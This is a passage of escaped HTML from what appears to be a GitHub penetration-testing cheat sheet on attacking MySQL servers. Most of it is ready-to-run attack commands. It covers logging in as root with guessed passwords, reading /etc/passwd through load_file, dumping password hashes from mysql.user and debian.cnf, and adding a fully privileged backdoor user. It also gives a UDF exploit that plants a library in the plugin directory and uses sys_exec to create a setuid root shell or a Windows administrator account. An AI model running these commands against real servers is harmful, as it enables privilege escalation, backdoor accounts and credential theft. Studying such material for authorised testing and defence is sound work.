-p\n# provide password\nmysql -u root -p'root'\n\n## Remotely:\nmysql -u root -h HOSTNAME\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e# Locally:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e as root without password (if allowed)\u003c/span\u003e\nmysql -u root\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e same, but prompt for password\u003c/span\u003e\nmysql -u root -p\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e provide password\u003c/span\u003e\nmysql -u root -p\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eroot\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e# Remotely:\u003c/span\u003e\nmysql -u root -h HOSTNAME\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eOnce logged in, check out the schema and environment:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"-- show list of databases\nshow databases;\n-- Set current database to mysql\nuse mysql;\n-- show tables in current database\nshow tables;\n-- describe the table schema for 'user' table\ndescribe user;\nselect table_name,column_name,table_schema from information_schema.columns where table_schema=database();\n\n-- show MySQL version (both versions work)\nselect version();\nselect @@version;\n-- show logged-in user\nselect user();\nselect system_user();\n-- show active database\nselect database();\nshow databases;\n-- show system architecture\nselect @@version_compile_os, @@version_compile_machine;\nshow variables like '%compile%';\n-- show plugin directory (for UDF exploit)\nselect @@plugin_dir;\nshow variables like 'plugin%';\n\n-- Try to execute code (try all ways)\n\\! id\nselect sys_exec('id');\nselect do_system('id');\n\n-- Try to read files\nselect load_file('/etc/passwd');\n-- more complex method\ncreate table if not exists test (entry TEXT);\nload data local infile \u0026quot;/etc/passwd\u0026quot; into table test fields terminated by '\\n';\nselect * from test;\n-- show file privileges of 'test' user\nselect user,file_priv from mysql.user where user='test';\n-- show all privs of current user\nselect * from mysql.user where user = substring_index(user(), '@', 1) ;\n\n-- Look at passwords\n-- MySQL 5.6 and below\nselect host, user, password from mysql.user;\n-- MySQL 5.7 and above\nselect host, user, authentication_string from mysql.user;\n\n-- add new user with full privileges\ncreate user test identified by 'test';\ngrant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to test identified by 'test' WITH GRANT OPTION;\n-- show exact privileges\nuse information_schema; select grantee, table_schema, privilege_type from schema_privileges;\nselect user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e show list of databases\u003c/span\u003e\nshow databases;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e Set current database to mysql\u003c/span\u003e\nuse mysql;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e show tables in current database\u003c/span\u003e\nshow tables;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e describe the table schema for 'user' table\u003c/span\u003e\ndescribe user;\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e table_name,column_name,table_schema \u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003einformation_schema\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecolumns\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ewhere\u003c/span\u003e table_schema\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003edatabase();\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e show MySQL version (both versions work)\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e version();\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e @@version;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e show logged-in user\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e user();\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esystem_user\u003c/span\u003e();\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e show active database\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e database();\nshow databases;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e show system architecture\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e @@version_compile_os, @@version_compile_machine;\nshow variables \u003cspan class=\"pl-k\"\u003elike\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e%compile%\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e show plugin directory (for UDF exploit)\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e @@plugin_dir;\nshow variables \u003cspan class=\"pl-k\"\u003elike\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eplugin%\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e Try to execute code (try all ways)\u003c/span\u003e\n\\! id\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e sys_exec(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eid\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e);\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e do_system(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eid\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e);\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e Try to read files\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e load_file(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e/etc/passwd\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e);\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e more complex method\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003ecreate\u003c/span\u003e \u003cspan class=\"pl-k\"\u003etable\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eif\u003c/span\u003e not exists test (entry \u003cspan class=\"pl-k\"\u003eTEXT\u003c/span\u003e);\nload data local infile \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e/etc/passwd\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e into table test fields terminated by \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003cspan class=\"pl-cce\"\u003e\\n\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e \u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e test;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e show file privileges of 'test' user\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e user,file_priv \u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003emysql\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003euser\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ewhere\u003c/span\u003e user\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003etest\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e show all privs of current user\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e \u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003emysql\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003euser\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ewhere\u003c/span\u003e user \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e substring_index(user(), \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e@\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e) ;\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e Look at passwords\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e MySQL 5.6 and below\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e host, user, password \u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003emysql\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003euser\u003c/span\u003e;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e MySQL 5.7 and above\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e host, user, authentication_string \u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003emysql\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003euser\u003c/span\u003e;\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e add new user with full privileges\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003ecreate\u003c/span\u003e \u003cspan class=\"pl-k\"\u003euser\u003c/span\u003e \u003cspan class=\"pl-en\"\u003etest\u003c/span\u003e identified by \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003etest\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-k\"\u003egrant\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eSELECT\u003c/span\u003e,CREATE,DROP,\u003cspan class=\"pl-k\"\u003eUPDATE\u003c/span\u003e,\u003cspan class=\"pl-k\"\u003eDELETE\u003c/span\u003e,INSERT \u003cspan class=\"pl-k\"\u003eon\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e to test identified by \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003etest\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e WITH \u003cspan class=\"pl-k\"\u003eGRANT\u003c/span\u003e OPTION;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e show exact privileges\u003c/span\u003e\nuse information_schema; \u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e grantee, table_schema, privilege_type \u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e schema_privileges;\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv \u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e user \u003cspan class=\"pl-k\"\u003ewhere\u003c/span\u003e user\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eOUTPUT OF select user()\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.17.1 MySQL UDF Exploit\u003c/h3\u003e\u003ca id=\"user-content-2171-mysql-udf-exploit\" class=\"anchor\" aria-label=\"Permalink: 2.17.1 MySQL UDF Exploit\" href=\"#2171-mysql-udf-exploit\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eExploiting User-Defined Functions in MySQL to get shell execution. First,\nready the UDF library (provides \u003ccode\u003esys_exec\u003c/code\u003e function) locally on the server.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003ePrerequisites:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eWrite permission (INSERT) for the databases \"func\" table\u003c/li\u003e\n\u003cli\u003eFILE privileges to copy our library (shared object) to the plugin directory\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# find sqlmap's copy of lib_mysqludf_sys.so (or dll)\nlocate lib_mysqludf_sys\n# found in /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so\n# copy the file into the server's /tmp/lib_mysqludf_sys.so for examples below\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e find sqlmap's copy of lib_mysqludf_sys.so (or dll)\u003c/span\u003e\nlocate lib_mysqludf_sys\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e found in /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e copy the file into the server's /tmp/lib_mysqludf_sys.so for examples below\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIn MySQL terminal:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"-- checking permissions\nselect * from mysql.user where user = substring_index(user(), '@', 1);\n-- checking architecture\nselect @@version_compile_os, @@version_compile_machine;\n-- or\nshow variables like '%compile%';\n-- checking plugin directory (where to drop udf library)\nselect @@plugin_dir;\n-- or\nshow variables like 'plugin%';\n\n-- Linux\nuse mysql;\ncreate table npn(line blob);\ninsert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));\nselect * from npn into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';\n-- alternative: hex encode .so file and dump it directly:\nselect binary 0x\u0026lt;shellcode\u0026gt; into dumpfile '\u0026lt;plugin_dir\u0026gt;/lib_mysqludf_sys.so';\ncreate function sys_exec returns integer soname 'lib_mysqludf_sys.so';\nselect sys_exec('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');\n-- then start local shell with `/tmp/rootbash -p` to get root\n\n-- Windows\nuse mysql;\ncreate table npn(line blob);\ninsert into npn values(load_files('c://temp//lib_mysqludf_sys_32.dll'));\nselect * from mysql.npn into dumpfile 'c://windows//system32//lib_mysqludf_sys_32.dll';\n-- alternative: dump hex shellcode directly into file:\nselect binary 0x\u0026lt;shellcode\u0026gt; into dumpfile '\u0026lt;plugin_dir\u0026gt;/lib_mysqludf_sys_32.dll';\ncreate function sys_exec returns integer soname 'lib_mysqludf_sys_32.dll';\nselect sys_exec(\u0026quot;net user derp Herpderp1! /add\u0026quot;);\nselect sys_exec(\u0026quot;net localgroup administrators derp /add\u0026quot;);\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e checking permissions\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e \u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003emysql\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003euser\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ewhere\u003c/span\u003e user \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e substring_index(user(), \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e@\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e);\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e checking architecture\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e @@version_compile_os, @@version_compile_machine;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e or\u003c/span\u003e\nshow variables \u003cspan class=\"pl-k\"\u003elike\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e%compile%\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e checking plugin directory (where to drop udf library)\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e @@plugin_dir;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e or\u003c/span\u003e\nshow variables \u003cspan class=\"pl-k\"\u003elike\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eplugin%\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e Linux\u003c/span\u003e\nuse mysql;\n\u003cspan class=\"pl-k\"\u003ecreate\u003c/span\u003e \u003cspan class=\"pl-k\"\u003etable\u003c/span\u003e \u003cspan class=\"pl-en\"\u003enpn\u003c/span\u003e(\u003cspan class=\"pl-k\"\u003eline\u003c/span\u003e blob);\n\u003cspan class=\"pl-k\"\u003einsert into\u003c/span\u003e npn \u003cspan class=\"pl-k\"\u003evalues\u003c/span\u003e(load_file(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e/tmp/lib_mysqludf_sys.so\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e));\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e \u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e npn into dumpfile \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e/usr/lib/mysql/plugin/lib_mysqludf_sys.so\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e alternative: hex encode .so file and dump it directly:\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e binary 0x\u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003eshellcode\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e into dumpfile \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u0026lt;plugin_dir\u0026gt;/lib_mysqludf_sys.so\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-k\"\u003ecreate\u003c/span\u003e \u003cspan class=\"pl-k\"\u003efunction\u003c/span\u003e \u003cspan class=\"pl-en\"\u003esys_exec\u003c/span\u003e returns \u003cspan class=\"pl-k\"\u003einteger\u003c/span\u003e soname \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003elib_mysqludf_sys.so\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e sys_exec(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ecp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e);\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e then start local shell with `/tmp/rootbash -p` to get root\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e Windows\u003c/span\u003e\nuse mysql;\n\u003cspan class=\"pl-k\"\u003ecreate\u003c/span\u003e \u003cspan class=\"pl-k\"\u003etable\u003c/span\u003e \u003cspan class=\"pl-en\"\u003enpn\u003c/span\u003e(\u003cspan class=\"pl-k\"\u003eline\u003c/span\u003e blob);\n\u003cspan class=\"pl-k\"\u003einsert into\u003c/span\u003e npn \u003cspan class=\"pl-k\"\u003evalues\u003c/span\u003e(load_files(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ec://temp//lib_mysqludf_sys_32.dll\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e));\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e \u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003emysql\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003enpn\u003c/span\u003e into dumpfile \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ec://windows//system32//lib_mysqludf_sys_32.dll\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e alternative: dump hex shellcode directly into file:\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e binary 0x\u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003eshellcode\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e into dumpfile \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u0026lt;plugin_dir\u0026gt;/lib_mysqludf_sys_32.dll\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-k\"\u003ecreate\u003c/span\u003e \u003cspan class=\"pl-k\"\u003efunction\u003c/span\u003e \u003cspan class=\"pl-en\"\u003esys_exec\u003c/span\u003e returns \u003cspan class=\"pl-k\"\u003einteger\u003c/span\u003e soname \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003elib_mysqludf_sys_32.dll\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e sys_exec(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003enet user derp Herpderp1! /add\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e);\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e sys_exec(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003enet localgroup administrators derp /add\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e);\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.17.2 Grabbing MySQL Passwords\u003c/h3\u003e\u003ca id=\"user-content-2172-grabbing-mysql-passwords\" class=\"anchor\" aria-label=\"Permalink: 2.17.2 Grabbing MySQL Passwords\" href=\"#2172-grabbing-mysql-passwords\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# contains plain-text password of the user debian-sys-maint\ncat /etc/mysql/debian.cnf\n\n# contains all the hashes of the MySQL users (same as what's in mysql.user table)\ngrep -oaE \u0026quot;[-_\\.\\*a-Z0-9]{3,}\u0026quot; /var/lib/mysql/mysql/user.MYD | grep -v \u0026quot;mysql_native_password\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e contains plain-text password of the user debian-sys-maint\u003c/span\u003e\ncat /etc/mysql/debian.cnf\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e contains all the hashes of the MySQL users (same as what's in mysql.user table)\u003c/span\u003e\ngrep -oaE \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e[-_\\.\\*a-Z0-9]{3,}\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e /var/lib/mysql/mysql/user.MYD \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003emysql_native_password\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.17.3 Useful MySQL Files\u003c/h3\u003e\u003ca id=\"user-content-2173-useful-mysql-files\" class=\"anchor\" aria-label=\"Permalink: 2.17.3 Useful MySQL Files\" href=\"#2173-useful-mysql-files\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 